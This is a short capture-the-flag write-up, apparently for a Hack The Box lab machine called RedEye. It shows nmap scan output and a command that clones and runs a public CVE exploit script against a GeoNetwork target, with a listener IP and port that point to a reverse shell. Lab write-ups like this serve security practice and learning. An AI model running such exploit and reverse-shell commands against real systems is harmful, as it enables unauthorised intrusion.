# RedEye



<img width="1582" height="282" alt="Screenshot 2026-11-15 193938" src="https://github.com/user-attachments/assets/70f54aa5-9fef-441f-9719-478c7dab0483" />

---

## nmap scan 

```
└─$ nmap -sCV -Pn 10.129.187.127
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-17 15:11 UTC
Nmap scan report for geo.airways.htb (10.129.187.127)
Host is up (0.37s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp   open  http    nginx
|_http-title: Error 404 - Not Found
443/tcp  open  https?
3000/tcp open  http    nginx
| http-title: Rocket.Chat
|_Requested resource was https://geo.airways.htb:3000/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.21 seconds
                                                                                             
```


<img width="1562" height="838" alt="image" src="https://github.com/user-attachments/assets/54d56e3c-26be-4de3-ad82-aa4117f90563" />

[CVE-2026-63219](https://github.com/Cyberuser-hash/CVE-2026-63219)

```
git clone https://github.com/Cyberuser-hash/CVE-2026-63219.git
cd CVE-2026-63219
python3 exploit.py --ip 10.10.16.34 --port 4444 --target http://geo.airways.htb/geonetwork
```

<img width="1017" height="329" alt="image" src="https://github.com/user-attachments/assets/dc198320-3dca-461a-815b-31ef9fd6e8ee" />


> # fuck the VPN

